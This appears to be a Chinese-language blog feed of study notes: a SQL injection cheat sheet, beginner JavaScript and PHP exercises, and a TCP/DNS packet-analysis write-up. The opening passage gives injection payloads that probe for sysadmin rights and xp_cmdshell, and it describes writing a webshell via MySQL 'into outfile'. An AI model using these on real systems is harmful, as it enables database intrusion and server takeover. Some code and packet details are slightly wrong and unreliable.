IS_SRVROLEMEMBER(‘sysadmin’)) //判断是否是系统管理员<br> and 1=(select IS_MEMBER(‘db_owner’))       //判断是否是库权限<br> and 1=(select HAS_DBACCESS(‘master’))      //判断是否有库读取权限<br> and 1=(select count(*) from master.dbo.sysobjects where xtype =’X’ and name=’xp_cmdshell’)   //判断XP_CMDSHELL是否存在</p><p>常识：</p><p>Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。</p><p>SQL Server中，中文的ASCII为正数，由于UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode()返回unicode值，再用nchar函数取得对应的中文字符。</p><p>Mysql注入<br>mysql数据库在渗透过程中能够使用的功能还是比较多的，除了读取数据之外，还可以进行对文件进行读写（前提是权限足够）。</p><p>读取前提：</p><p>1.用户权限足够高，尽量具有root权限。</p><p>2.secure_file_priv不为NULL。</p><p>3.获取web目录的物理路径。</p><p> Mysql用secure_file_priv这个配置项来完成对数据导入导出的限制。如果secure_file_priv=NULL，Mysql服务会禁止导入和导出操作。通过命令查看secure_file_priv的当前值，确认是否允许导入导出以及导出文件路径。<br> show variables like ‘%secure_file_priv’;</p><p> MySQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有file权限就可以执行select into outfile操作。</p><p> 当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> sqlserver </tag>
            
            <tag> access </tag>
            
            <tag> oracle </tag>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>水仙花数-九九乘法表</title>
      <link href="/2021/12/31/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/"/>
      <url>/2021/12/31/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>水仙花数-1</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = prompt(<span class="string">'请输入一个数字：'</span>);</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">parseInt</span>(num /<span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">parseInt</span>(num %<span class="number">100</span> / <span class="number">10</span> );</span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">parseInt</span>(num % <span class="number">100</span> % <span class="number">10</span>);</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">Math</span>.pow(a,<span class="number">3</span>)+<span class="built_in">Math</span>.pow(b,<span class="number">3</span>)+<span class="built_in">Math</span>.pow(c,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(num) == s &amp;&amp; s != <span class="number">0</span>){</span><br><span class="line">     <span class="built_in">console</span>.log(num + <span class="string">'这个数字是水仙花数'</span>);</span><br><span class="line"> }<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; <span class="number">100</span>) {</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"请输入3位数"</span>)</span><br><span class="line"> }<span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这不是水仙花数'</span>)</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = prompt(<span class="string">'请输入一个数字：'</span>);</span><br><span class="line"><span class="keyword">var</span> n1 = <span class="built_in">parseInt</span>(num[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">var</span> n2 = <span class="built_in">parseInt</span>(num[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">var</span> n3 = <span class="built_in">parseInt</span>(num[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(n1,n2,n3);</span><br><span class="line"><span class="keyword">var</span> s = (n1*n1*n1)+(n2*n2*n2)+(n3*n3*n3);</span><br><span class="line"><span class="built_in">console</span>.log(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(num) == s &amp;&amp; s != <span class="number">0</span>){</span><br><span class="line">    <span class="built_in">console</span>.log(num + <span class="string">'这个数字是水仙花数'</span>);</span><br><span class="line">}<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; <span class="number">100</span>) {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"请输入3位数"</span>)</span><br><span class="line">}<span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这不是水仙花数'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>水仙花数-for</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//100- 1000 以内的水仙花数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++){</span><br><span class="line">    <span class="keyword">var</span> a,b,c</span><br><span class="line">    a = <span class="built_in">parseInt</span>(i/<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    b = <span class="built_in">parseInt</span>(i%<span class="number">100</span>/<span class="number">10</span>);</span><br><span class="line">    <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    c = <span class="built_in">parseInt</span>(i%<span class="number">10</span>);</span><br><span class="line">   <span class="comment">//document.write(a,b,c);</span></span><br><span class="line">   <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    result = <span class="built_in">Math</span>.pow(a,<span class="number">3</span>) + <span class="built_in">Math</span>.pow(b,<span class="number">3</span>) + <span class="built_in">Math</span>.pow(c,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">//document.write(result);</span></span><br><span class="line">    <span class="keyword">if</span> (result === i){</span><br><span class="line">        <span class="built_in">document</span>.write(i);</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-for</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++){</span><br><span class="line">        <span class="comment">//document.write(i)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++){</span><br><span class="line">            <span class="built_in">document</span>.write(j + <span class="string">'x'</span> + i + <span class="string">'='</span> + (i*j))</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-for-if</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++){</span><br><span class="line">        <span class="comment">//document.write(i)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++){</span><br><span class="line">            <span class="built_in">document</span>.write(j + <span class="string">'x'</span> + i + <span class="string">'='</span> + (i*j))</span><br><span class="line">            <span class="keyword">if</span>(j==i){</span><br><span class="line">               <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//document.write('&lt;br&gt;')</span></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>冒泡排序，给两个数然后输出最大的数</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="comment">//冒泡排序,给两个数,然后输出最大的数</span></span><br><span class="line">    <span class="comment">//var all = [5,3,7,1,8,2,10,4,6,9]</span></span><br><span class="line">    <span class="keyword">var</span> all = [<span class="number">45</span>,<span class="number">23</span>,<span class="number">76</span>,<span class="number">35</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">64</span>,<span class="number">99</span>,<span class="number">57</span>] <span class="comment">// 0-8位长度</span></span><br><span class="line">    <span class="comment">//var all = Math.random(1,100)</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;all.length-<span class="number">1</span>;i++){    <span class="comment">//控制遍历比较的次数，最后的位置不用每次遍历，减1</span></span><br><span class="line">                <span class="comment">//document.write(all)</span></span><br><span class="line">                <span class="comment">//document.write('---------------------&lt;br&gt;')</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> a=<span class="number">0</span>;a&lt;all.length-<span class="number">1</span>-i;a++){  <span class="comment">//控制每一次遍历的次数</span></span><br><span class="line">            <span class="keyword">if</span>(all[a] &gt; all[a-<span class="number">1</span>] ) {    <span class="comment">//调换数组位置</span></span><br><span class="line">                <span class="keyword">var</span> result = all[a]</span><br><span class="line">                all[a] = all[a-<span class="number">1</span>]</span><br><span class="line">                all[a-<span class="number">1</span>] = result</span><br><span class="line">            <span class="comment">//document.write(all)</span></span><br><span class="line">            <span class="comment">//document.write('&lt;br&gt;')</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// var result = all[i] &lt; all[i+1]</span></span><br><span class="line">        <span class="comment">// document.write(result)</span></span><br><span class="line">        <span class="comment">// document.write('&lt;br&gt;')}</span></span><br><span class="line">    }</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'----------------------------&lt;br&gt;'</span>)</span><br><span class="line"><span class="built_in">document</span>.write(all)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>水仙花数-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100</span>; <span class="variable">$i</span> &lt; <span class="number">1000</span>; <span class="variable">$i</span>++) {</span><br><span class="line"><span class="comment">// 字符串转换为int类型的时候，不能使用int()，需要使用 intval()</span></span><br><span class="line"><span class="variable">$a</span> = intval(<span class="variable">$i</span>/<span class="number">100</span>);</span><br><span class="line"><span class="variable">$b</span> = intval(<span class="variable">$i</span>%<span class="number">100</span>/<span class="number">10</span>);</span><br><span class="line"><span class="variable">$c</span> = intval(<span class="variable">$i</span>%<span class="number">10</span>);</span><br><span class="line"><span class="comment">//$result = ($a*$a*$a)+($b*$b*$b)+($c*$c*$c);</span></span><br><span class="line"><span class="variable">$result</span> = pow(<span class="variable">$a</span>, <span class="number">3</span>) + pow(<span class="variable">$b</span>, <span class="number">3</span>) + pow(<span class="variable">$c</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//$result = pow($a,3);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> == <span class="variable">$i</span>) {</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>水仙花数-php-for-2</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">100</span>;<span class="variable">$i</span>&lt;=<span class="number">1000</span>;<span class="variable">$i</span>++){</span><br><span class="line"><span class="comment">// 将字符串分割为数组取值</span></span><br><span class="line"><span class="variable">$r</span> = str_split(<span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$r</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$r</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$r</span>[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//$result = ($a*$a*$a)+($b*$b*$b)+($c*$c*$c);</span></span><br><span class="line"><span class="variable">$result</span> = pow(<span class="variable">$a</span>,<span class="number">3</span>)+pow(<span class="variable">$b</span>,<span class="number">3</span>)+pow(<span class="variable">$c</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//$result = pow($a,3);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> == <span class="variable">$i</span>){</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">9</span>; <span class="variable">$i</span>++) {</span><br><span class="line"><span class="comment">//echo $i;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&lt;=<span class="variable">$i</span>;<span class="variable">$j</span>++){</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span> .<span class="string">'x'</span> . <span class="variable">$i</span> . <span class="string">'='</span> . (<span class="variable">$j</span>*<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;td&gt; &lt;/td&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>冒泡排序-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//冒泡排序</span></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">21</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">44</span>,<span class="number">35</span>,<span class="number">57</span>,<span class="number">48</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">100</span>,<span class="number">95</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$r</span>)-<span class="number">1</span>;<span class="variable">$i</span>++){</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;count(<span class="variable">$r</span>)-<span class="number">1</span>-<span class="variable">$i</span>;<span class="variable">$a</span>++){</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$r</span>[<span class="variable">$a</span>]&lt;<span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>]){</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$r</span>[<span class="variable">$a</span>];</span><br><span class="line">    <span class="variable">$r</span>[<span class="variable">$a</span>] = <span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>] = <span class="variable">$result</span>;</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">var_dump(<span class="variable">$r</span>);</span><br><span class="line"><span class="comment">//echo $r;  //echo无法输出array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 水仙花数 </tag>
            
            <tag> 九九乘法表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-dos-思维导图</title>
      <link href="/2021/12/27/win-dos-%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
      <url>/2021/12/27/win-dos-%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/win%20dos%20%E6%80%9D%E7%BB%B4%E8%84%91%E5%9B%BE.png" alt="win dos 思维脑图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 思维脑图 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML，Js和CSS</title>
      <link href="/2021/12/26/HTML%EF%BC%8CJs%E5%92%8CCSS/"/>
      <url>/2021/12/26/HTML%EF%BC%8CJs%E5%92%8CCSS/</url>
      
        <content type="html"><![CDATA[<p>  一、HTML 超文本标记语言（Hyper Text Markup Language）</p><p>​            HTML是标记语言，不是编程语言</p><p>​                工具自动生成</p><p>​            <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211226121618835.png" alt="image-20211226121618835"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211226121847653.png" alt="image-20211226121847653"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> JavaScript </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP握手与挥手</title>
      <link href="/2021/12/25/TCP%E6%8F%A1%E6%89%8B%E4%B8%8E%E6%8C%A5%E6%89%8B/"/>
      <url>/2021/12/25/TCP%E6%8F%A1%E6%89%8B%E4%B8%8E%E6%8C%A5%E6%89%8B/</url>
      
        <content type="html"><![CDATA[<p>nc -lvnp 8080                        nc 127.0.0.1 8080</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232618476.png" alt="image-20211225232618476"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232639421.png" alt="image-20211225232639421"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232653750.png" alt="image-20211225232653750"></p><p>curl</p><p>都可以抓包</p><p>一.分析tcp三次握手，四次挥手，和数据包传输过程，并截图分析。 TCP数据段分析</p><p>​    \1.  源端口和目的端口 各占 16位</p><p>​    \2.  序号占 32位</p><p>​    \3.  确认号占 32位</p><p>​    \4.  数据偏移占 4位 即首部长度</p><p>​    \5.  保留位占 6位</p><p>​    \6.  紧急URG占 1位，当为1时，报告此文件中有紧急数据</p><p>​    \7.  确认ACK占 1位，确认有效，否则 (3)：“确认号” 字段无效</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225226141.png" alt="image-20211225225226141"></p><p>​            URG紧急指针（urgent pointer）有效。</p><p>​            ACK表示响应</p><p>​            PSH表示有 DATA数据传输</p><p>​            RST表示连接重置</p><p>​            SYN表示建立连接</p><p>​            FIN表示关闭连接        </p><p>位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p><p>第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</p><p>第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；</p><p>第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</p><p>完成三次握手，主机A与主机B开始传送数据。</p><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。<br>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><p>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据.</p><p>打开Wireshark</p><p>​    打开一个网站 <a href="http://www.tianya.cn/">http://www.tianya.cn/</a></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225307516.png" alt="image-20211225225307516"></p><p>​    第4个包表示HTTP确实使是使用TCP建立连接的</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225325803.png" alt="image-20211225225325803"></p><p>TCP第一次握手</p><p>​    客户端发送一个TCP包，标志位为 SYN，序号为0 表示客户端请求连接</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225341864.png" alt="image-20211225225341864"></p><p>TCP 第二次握手</p><p>​    服务器返回确认包，标志位为 SYN,ACK 将确认序号为 SN(0) +NSN(1) = ACK(1)</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225400586.png" alt="image-20211225225400586"></p><p>TCP 第三次握手</p><p>客户端确定收到服务器发来的 确认包 1 </p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225414669.png" alt="image-20211225225414669"></p><p>数据链路层 以太网</p><p>属于 目标MAC地址为 58：25：75：a5：2f：a7</p><p>源 MAC 地址为：74：86：7a：56：3c：f9</p><p>类型为 IP 数据包</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225456503.png" alt="image-20211225225456503"></p><p>网络层</p><p>版本为 IPv4</p><p>头部数据长度为 20 字节</p><p>Fragment的偏移量为 0 </p><p>Headr Checksum 为头部校验和</p><p>目标IP地址为：124.225.206.22 ，源 IP 地址为：192.168.21.2</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225539744.png" alt="image-20211225225539744"></p><p>传输层</p><p>目标端口为2456 </p><p>源端口为 80</p><p>Acknowledgment Number 为1表示数据包收到，确认有效</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225553061.png" alt="image-20211225225553061"></p><p>Window表示窗口大小为 516 字节</p><p>TCP握手类似打电话</p><p>​    比如张三给你李四打电话</p><p>​       张三：喂，我是张三，你是李四吗？</p><p>​       李四：我是李四，你能听到吗？</p><p>​       张三：我能听到</p><p>​    至此他们之间建立了连接</p><p>分析4次挥手</p><p><code>curl -v check.amazonaws.com</code></p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225230651274.png" alt="image-20211225230651274" style="zoom: 200%;"><p>\1.  发起关闭的 是 客户端 先发送了一个 FIN, ACK 的FIN,ACK seq=2，ACK=2</p><p>\2.  第二次服务端给 客户端发送 ACK seq=1 ack=3</p><p>\3.  第三次客户端发给服务端 FIN, ACK seq=1 ACK=3</p><p>\4. 第四次客户端发给服务端 FIN, ACK seq=3 ACK=1</p><p>二. DNS</p><p><code>nslookup 网址</code></p><p>整个DNS报文分3部分，基础结构部分，问题部分，资源记录部分</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231045499.png" alt="image-20211225231045499"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231048702.png" alt="image-20211225231048702"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231053777.png" alt="image-20211225231053777"></p><p>1..事务ID（Transaction ID）请求报⽂和其对应的应答报⽂，这个字段的值是相同的。</p><p>\2. 标志(Flags)：DNS 报⽂中的标志字段</p><p>\3. 问题计数（Questions）：DNS 查询请求的数⽬</p><p>\4. 回答资源记录数(Answres RRs)：DNS 响应的数⽬</p><p>\5. 权威名称服务器计数(Authority RRs)：权威名称服务器的数⽬</p><p>\6. 附加资源记录数(Additional)：额外的记录数⽬（权威名称服务器对应 IP 地址的数⽬）</p><p>​    QR(Respons):查询或请求标志信息，查询时：0响应时：1</p><p>​    Opcode：操作码，0表示标志查询，1表示反向查询，2表示服务器状态请求</p><p>​    AA（Authoritative）:授权应答，值为1时表示该服务器是权威的服务器，0表示不是权威服务器</p><p>​    TC（Truncated）:表示是否被截断，1为响应超过512字节并被截断</p><p>​    RD（Recursion Desired）:表示这个字段在一个查询中的设置，并且响应中返回。标志为告诉名称服务器必须处理这个查询，这种方式是一种递归查询，值为0时，且请求的名称服务器没有一个授权回答，将返回一个能解答该查询的其他服务器列表</p><p>​    RA（Recursion Available）:这个字段只出现在响应报文中，为1时表示服务器支持递归查询</p><p>​    Z：保留字段，所有的请求和应答报文中，这个值必须为0</p><p>​    rcode(Reply code)：返回码字段，表示响应的差错状态</p><p>​       为0时：没有错误</p><p>​       为1时：有格式错误</p><p>​       为2时：服务器的原因无法处理这个请求</p><p>​       为3时：名字错误，解析的域名不存在</p><p>​       为4时：域名服务器不支持查询类型</p><p>​       为5时：服务器配置策略拒绝回应</p><p>​       为6-15时 保留值</p><p>三. UDP</p><p><code>ping 网站</code>                //    ping 发出的是 ICMP 包</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231138399.png" alt="image-20211225231138399"></p><p><img src="../img/image-20211225231145250.png" alt="image-20211225231145250"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231156336.png" alt="image-20211225231156336"></p><p>​    UDP 是无连接的，即时发送数据之前不需要建立连接</p><p>​    UDP 最大努力传输，不保证可靠</p><p>​    UDP 面向报文，没有拥塞控制，适合多媒体或游戏通信要求</p><p>​    UDP 支持1对1，1对多，多对1和多对多的通信</p><p>​    UDP 首部开销小</p><p>四. DHCP</p><p>释放IP</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231217203.png" alt="image-20211225231217203"></p><p>获取IP</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231224233.png" alt="image-20211225231224233"></p><p><img 